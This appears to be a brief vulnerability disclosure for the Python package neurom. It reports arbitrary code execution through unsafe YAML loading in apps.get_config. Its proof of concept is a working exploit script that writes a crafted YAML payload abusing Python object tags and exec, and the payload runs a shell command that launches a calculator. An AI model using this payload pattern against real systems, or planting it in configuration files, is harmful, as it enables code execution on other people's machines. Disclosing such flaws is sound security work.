# Description

`neurom` is a Neuronal Morphology Analysis Tool, which is vulnerable to `Arbitary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip3 install neurom
```

### Run exploit.py
```
import os
#os.sysem('pip3 install neurom')
from neurom import apps
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('config.yml','w+').write(payload)
apps.get_config('config.yml','config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
